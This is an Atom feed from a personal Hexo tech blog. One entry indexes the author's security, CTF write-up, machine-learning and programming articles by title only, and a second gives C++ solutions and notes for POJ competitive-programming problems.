<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chybeta</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-08-23T13:54:39.177Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>chybeta</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一些文章</title>
    <link href="http://yoursite.com/3017/07/26/%E4%B8%80%E4%BA%9B%E6%96%87%E7%AB%A0/"/>
    <id>http://yoursite.com/3017/07/26/一些文章/</id>
    <published>3017-07-26T11:27:04.000Z</published>
    <updated>2017-08-23T13:54:39.177Z</updated>
    
    <content type="html"><![CDATA[<p>一些自己写的文章。<br><a id="more"></a></p>
<h1 id="Project"><a href="#Project" class="headerlink" title="Project"></a>Project</h1><ul>
<li><a href="https://github.com/CHYbeta/Web-Security-Learning" target="_blank" rel="external">Web-Security-Learning</a></li>
<li><a href="https://github.com/CHYbeta/Software-Security-Learning" target="_blank" rel="external">Software-Security-Learning</a></li>
<li><a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="external">cmsPoc:CMS渗透测试框架 </a></li>
<li><a href="https://chybeta.gitbooks.io/the-path-to-machine-learning/content/" target="_blank" rel="external">The Path to Machine Learning</a></li>
<li><a href="https://book.ph0en1x.com/" target="_blank" rel="external">Awesome CTF Book</a></li>
<li><a href="https://chybeta.gitbooks.io/vuln-time/content/" target="_blank" rel="external">Vuln-Time</a></li>
</ul>
<h1 id="Web-Security"><a href="#Web-Security" class="headerlink" title="Web Security"></a>Web Security</h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ul>
<li><a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" target="_blank" rel="external">命令执行的一些绕过技巧</a></li>
<li><a href="https://chybeta.github.io/2017/07/26/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">php代码执行漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/07/21/MySql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/" target="_blank" rel="external">MySql注入备忘录</a></li>
<li><a href="https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/" target="_blank" rel="external">php代码审计小总结 </a></li>
<li><a href="https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" target="_blank" rel="external">小试XML实体注入攻击 </a></li>
<li><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">浅谈php反序列化漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/05/13/%E5%88%A9%E7%94%A8PHP%E7%9A%84OPcache%E6%9C%BA%E5%88%B6getshell/" target="_blank" rel="external">利用PHP的OPcache机制getshell</a></li>
</ul>
<h2 id="Vuln-Analysis"><a href="#Vuln-Analysis" class="headerlink" title="Vuln Analysis"></a>Vuln Analysis</h2><ul>
<li><a href="https://chybeta.github.io/2017/08/04/%C2%96PHPCMS-v9-6-0-wap%E6%A8%A1%E5%9D%97sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="external">PHPCMS v9.6.0 wap模块sql注入漏洞分析</a></li>
<li><a href="https://chybeta.github.io/2017/07/22/PHPCMS-v9-6-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="external">PHPCMS v9.6.0 任意文件上传漏洞分析 </a></li>
<li><a href="https://chybeta.github.io/2017/07/11/Catfish-%E9%B2%B6%E9%B1%BC-CMS-V-4-4-10-%E7%95%99%E8%A8%80%E6%9D%BF%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">Catfish(鲶鱼) CMS V 4.4.10 留言板存储型XSS漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/05/19/CVE-2017-8917-Joomla-3-7-0-SQL-Injection%E5%88%86%E6%9E%90/" target="_blank" rel="external">[CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析 </a></li>
<li><a href="https://chybeta.github.io/2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection%E5%88%86%E6%9E%90/" target="_blank" rel="external">[CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析 </a></li>
<li><a href="https://chybeta.github.io/2017/03/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%9ABlueCMSv1-6-sp1/" target="_blank" rel="external">代码审计之SQL注入：BlueCMSv1.6 sp1 </a></li>
</ul>
<h1 id="Bin-Security"><a href="#Bin-Security" class="headerlink" title="Bin Security"></a>Bin Security</h1><ul>
<li><a href="https://chybeta.github.io/2017/08/14/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/" target="_blank" rel="external">逆向学习笔记（一）</a></li>
<li><a href="https://chybeta.github.io/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/#more" target="_blank" rel="external">ROP学习：利用通用gadget </a></li>
<li><a href="https://chybeta.github.io/2017/06/26/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/" target="_blank" rel="external">ROP学习：64位栈溢出</a></li>
</ul>
<h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><ul>
<li><a href="https://chybeta.github.io/2017/07/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%EF%BC%9A%E6%9C%80%E8%BF%91%E9%82%BB-KNN/" target="_blank" rel="external">机器学习算法：最近邻(KNN)</a></li>
<li><a href="https://chybeta.github.io/2017/07/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95-%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron/" target="_blank" rel="external">机器学习算法：感知机(perceptron) </a></li>
<li><a href="https://chybeta.github.io/2017/07/06/Tensorflow%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%B8%B8%E7%94%A8API/" target="_blank" rel="external">Tensorflow学习：常用API</a></li>
<li><a href="https://chybeta.github.io/2017/03/15/win%E4%B8%8Btensorflow%E5%AE%89%E8%A3%85%E9%81%BF%E5%9D%91%E6%8C%87%E5%8D%97-0/" target="_blank" rel="external">win下tensorflow安装避坑指南</a></li>
</ul>
<h1 id="数据挖掘"><a href="#数据挖掘" class="headerlink" title="数据挖掘"></a>数据挖掘</h1><ul>
<li><a href="https://chybeta.github.io/2017/01/22/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%880%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B9%8Banaconda%E5%AE%89%E8%A3%85/" target="_blank" rel="external">数据挖掘比赛（0）环境搭建之anaconda安装</a></li>
<li><a href="https://chybeta.github.io/2017/01/24/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%881%EF%BC%89%E5%AF%B9%E6%97%A0%E5%88%97%E5%90%8D%E7%9A%84txt%E6%95%B0%E6%8D%AE%E9%9B%86%E8%AF%BB%E5%8F%96%E6%96%B9%E6%B3%95%E5%8F%8A%E5%A4%84%E7%90%86/" target="_blank" rel="external">数据挖掘比赛（1）对无列名的txt数据集读取方法及处理</a></li>
<li><a href="https://chybeta.github.io/2017/01/25/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8pandas%E8%AF%BB%E5%8F%96%E5%A4%A7%E5%9E%8B%E6%95%B0%E6%8D%AE%E9%9B%86/" target="_blank" rel="external">数据挖掘比赛（2）利用pandas读取大型数据集</a></li>
<li><a href="https://chybeta.github.io/2017/01/29/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%883%EF%BC%89%E7%94%B3%E8%AF%B7anaconda-academic-license%E5%B9%B6%E4%BD%BF%E7%94%A8/" target="_blank" rel="external">数据挖掘比赛（3）申请anaconda-academic-license并使用</a></li>
<li><a href="https://chybeta.github.io/2017/02/01/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%884%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8A/" target="_blank" rel="external">数据挖掘比赛（4）ten Minutes to pandas中文版上 </a></li>
<li><a href="https://chybeta.github.io/2017/02/02/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%885%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8B/" target="_blank" rel="external">数据挖掘比赛（5）ten Minutes to pandas中文版下</a></li>
</ul>
<h1 id="技术杂谈"><a href="#技术杂谈" class="headerlink" title="技术杂谈"></a>技术杂谈</h1><ul>
<li><a href="https://chybeta.github.io/2017/02/14/win%E4%B8%8BDocker%E9%BB%98%E8%AE%A4%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE%E4%BF%AE%E6%94%B9/" target="_blank" rel="external">win下Docker默认存储位置修改</a></li>
<li><a href="https://chybeta.github.io/2017/02/13/windows%E5%B9%B3%E5%8F%B0%E4%B8%8BDocker%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_blank" rel="external">windows平台下Docker环境搭建</a></li>
</ul>
<h1 id="编程练习"><a href="#编程练习" class="headerlink" title="编程练习"></a>编程练习</h1><ul>
<li><a href="https://chybeta.github.io/3017/06/19/ACM-OJ-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/" target="_blank" rel="external">ACM-OJ[长期更新]</a></li>
<li><a href="https://chybeta.github.io/2017/08/12/hihoCoder-162%E5%91%A8%EF%BC%9A%E5%9B%9E%E6%96%87%E5%AD%97%E7%AC%A6%E4%B8%B2/" target="_blank" rel="external">hihoCoder 162周：回文字符串 </a></li>
<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-3-%E6%95%B0%E7%BB%84%E5%8D%95%E8%B0%83%E5%92%8C/" target="_blank" rel="external">CodeTrain(3)数组单调和</a></li>
<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-2-%E6%A3%8B%E5%AD%90%E7%BF%BB%E8%BD%AC/" target="_blank" rel="external">CodeTrain(2)棋子翻转</a></li>
<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-1-%E6%9C%80%E5%A4%A7%E5%B7%AE%E5%80%BC/" target="_blank" rel="external">CodeTrain(1)最大差值</a></li>
</ul>
<h1 id="随笔"><a href="#随笔" class="headerlink" title="随笔"></a>随笔</h1><ul>
<li><a href="https://chybeta.github.io/2017/02/17/%E8%AE%B02017%E5%B9%B4%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E4%B9%8B%E8%A1%8C/" target="_blank" rel="external"> 记2017年阿里巴巴之行
</a></li>
</ul>
<h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-XSS-writeup/" target="_blank" rel="external">XMAN夏令营-2017-XSS-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-%E6%AF%94%E8%B5%9B%E7%B3%BB%E7%BB%9F-writeup/" target="_blank" rel="external">XMAN夏令营-2017-比赛系统-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/" target="_blank" rel="external">XMAN夏令营-2017-babyweb-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-default-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-default-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%98%B3%E5%85%89%E6%80%BB%E5%9C%A8%E9%A3%8E%E9%9B%A8%E5%90%8E-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-阳光总在风雨后-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-Document-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-Document-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/17/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E6%9C%80%E5%AE%89%E5%85%A8%E7%9A%84%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-最安全的笔记管理系统-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-vote-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-vote-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-php%E6%98%AF%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-php是最好的语言-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%83%A8%E5%88%86%E7%AE%80%E5%8D%95%E9%A2%98%E6%B1%87%E6%80%BB-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-部分简单题汇总-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/" target="_blank" rel="external">SHACTF-2017-Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-web-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/24/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/" target="_blank" rel="external">实验吧-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/19/CTFZone-2017-Leaked-messages-writeup/" target="_blank" rel="external">CTFZone-2017-Leaked messages-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-web-writeup/" target="_blank" rel="external">XMAN选拔赛-2017-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/16/Meenpwn-2017-web-writeup/" target="_blank" rel="external">Meenpwn-2017-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/15/%E4%B8%80%E9%81%93%E5%A5%BD%E7%8E%A9%E7%9A%84webshell%E9%A2%98/" target="_blank" rel="external">一道好玩的webshell题 </a></li>
<li><a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/" target="_blank" rel="external">jarvisoj-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/06/30/%C2%96ringzer0team-js-writeup/" target="_blank" rel="external">ringzer0team-js-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/30/%C2%96ringzer0team-web-writeup/" target="_blank" rel="external">ringzer0team-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/25/xss-quiz-writeup/" target="_blank" rel="external">xss-quiz-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/19/GCTF-web-writeup/" target="_blank" rel="external">GCTF-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/" target="_blank" rel="external">“春秋杯”web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/01/12/%E5%8D%97%E9%82%AECTF%E5%B9%B3%E5%8F%B0web%E5%89%8D30%E9%A2%98%E8%A7%A3/" target="_blank" rel="external">南邮CTF平台web前30题解</a></li>
</ul>
<h3 id="sqli-lab"><a href="#sqli-lab" class="headerlink" title="sqli-lab"></a>sqli-lab</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less17-writeup/" target="_blank" rel="external">Sqli-Labs:Less17-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less15-16-writeup/" target="_blank" rel="external">Sqli-Labs:Less15~16-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less13-14-writeup/" target="_blank" rel="external">Sqli-Labs:Less13~14-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less11-12-writeup/" target="_blank" rel="external">Sqli-Labs:Less11~12-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less8-10-writeup/" target="_blank" rel="external">Sqli-Labs:Less8~10-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/12/Sqli-Labs-Less7-writeup/" target="_blank" rel="external">Sqli-Labs:Less7-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/12/Sqli-Labs-Less5-6-writeup/" target="_blank" rel="external">Sqli-Labs:Less5-6-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/04/02/Sqli-Labs-Less1-4-writeup/" target="_blank" rel="external">Sqli-Labs:Less1-4-writeup</a></li>
</ul>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="CTF-1"><a href="#CTF-1" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/12/Codegate-2017-Qual-babypwn-writeup/" target="_blank" rel="external">Codegate 2017 Qual-babypwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-pwn-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-pwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-pwn-writeup/" target="_blank" rel="external">XMAN选拔赛-2017-pwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/06/29/XMAN-pwn-writeup/" target="_blank" rel="external">XMAN-pwn-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/28/SUCTF-2016-pwn400-writeup/" target="_blank" rel="external">SUCTF-2016-pwn400-writeup</a></li>
</ul>
<h3 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/01/Pwnable-kr-shellshock/" target="_blank" rel="external">Pwnable.kr:shellshock</a></li>
<li><a href="https://chybeta.github.io/2017/08/01/Pwnable-kr-mistake/" target="_blank" rel="external">Pwnable.kr:mistake</a></li>
<li><a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/" target="_blank" rel="external">Pwnable.kr:random </a></li>
<li><a href="https://chybeta.github.io/2017/04/08/Pwnable-kr-passcode/" target="_blank" rel="external">Pwnable.kr:passcode</a></li>
<li><a href="https://chybeta.github.io/2017/04/07/Pwnable-kr-bof/" target="_blank" rel="external">Pwnable.kr:bof</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Growing-Up-writeup/" target="_blank" rel="external">SHACTF-2017-Growing Up-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-WannaFly-writeup/" target="_blank" rel="external">SHACTF-2017-WannaFly-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-misc-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-misc-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/23/0ctf-2015-Peers-writeup/" target="_blank" rel="external">0ctf-2015-Peers-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/17/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-misc-writeup/" target="_blank" rel="external">XMAN选拔赛-2017-misc-writeup</a></li>
</ul>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><ul>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-crypto-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-crypto-writeup</a></li>
<li><a href="Meenpwn-2017-crypto-writeup">Meenpwn-2017-crypto-writeup</a></li>
</ul>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><ul>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-Reverse-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-Reverse-writeup</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一些自己写的文章。&lt;br&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://yoursite.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ACM-OJ[长期更新]</title>
    <link href="http://yoursite.com/3017/06/19/ACM-OJ-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/"/>
    <id>http://yoursite.com/3017/06/19/ACM-OJ-长期更新/</id>
    <published>3017-06-19T08:40:18.000Z</published>
    <updated>2017-08-11T04:29:51.870Z</updated>
    
    <content type="html"><![CDATA[<p>最近更新日期：2017-08-11<br>干脆把自己平日做的题放在一篇文章里吧。不然太分散了。<br>POJ: 1163 1182 1258 1273 1979 2236 2388 3069 3176 3253 3617<br>XOJ: 1004 1005 1022 1061 1062 1075 1078 1316<br><a id="more"></a></p>
<h1 id="POJ"><a href="#POJ" class="headerlink" title="POJ"></a>POJ</h1><h2 id="1163"><a href="#1163" class="headerlink" title="1163"></a>1163</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=1163" target="_blank" rel="external">http://poj.org/problem?id=1163</a></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>见下面POJ-3176题分析</p>
<h3 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 355</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> way[MAX][MAX] = &#123;<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">int</span> triangle[MAX][MAX] = &#123;<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;triangle[i][j]);</div><div class="line"></div><div class="line">    way[<span class="number">0</span>][<span class="number">0</span>] = triangle[<span class="number">0</span>][<span class="number">0</span>];</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> ( j == <span class="number">0</span> )</div><div class="line">            &#123;</div><div class="line">                way[i][j] = way[i<span class="number">-1</span>][j] + triangle[i][j];</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( j == i )</div><div class="line">            &#123;</div><div class="line">                way[i][j] = way[i<span class="number">-1</span>][j<span class="number">-1</span>] + triangle[i][j];</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span></div><div class="line">            &#123;</div><div class="line">                way[i][j] = max(way[i<span class="number">-1</span>][j],way[i<span class="number">-1</span>][j<span class="number">-1</span>]) + triangle[i][j];</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    <span class="keyword">int</span> lastrow = n - <span class="number">1</span>;</div><div class="line">    <span class="keyword">int</span> res = way[lastrow][<span class="number">0</span>];</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; n; j++)&#123;</div><div class="line">        <span class="keyword">if</span> (way[lastrow][j] &gt; res )</div><div class="line">            res = way[lastrow][j];</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, res);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1182"><a href="#1182" class="headerlink" title="1182"></a>1182</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=1182" target="_blank" rel="external">http://poj.org/problem?id=1182</a></p>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>并查集使用。输入的x，有三种种类A,B,C，分别用x，x+n,x+2n来代表。<br>输入后，先判断x，y是否符合范围要求。<br>第一种关系中：x和y是同一种种类。即union_set(x,y),union_set(x+n,y+n),union_set(x+2<em>n,y+2</em>n)。在执行union_set()之前，要看是否存在矛盾关系，即判断same_set(x,y+n) || same_set(x,y+2<em>n) || same_set(x+n,y) || same_set(x+n,y+2</em>n) || same_set(x+2<em>n,y) || same_set(x+2</em>n,y+n)。<br>第二种关系中；x吃y。即union_set(x,y+n),union_set(x+n,y+2<em>n),union_set(x+3</em>n,y).。在执行union_set()之前，要看是否存在矛盾关系，即判断same_set(x,y)|| same_set(x,y+2<em>n) || same_set(x+n,y+n) ||same_set(x+n,y) || same_set(x+2</em>n,y+n) || same_set(x+2<em>n,y+2</em>n)。</p>
<p>另外数组如果开小的话，会导致runtime error。。。</p>
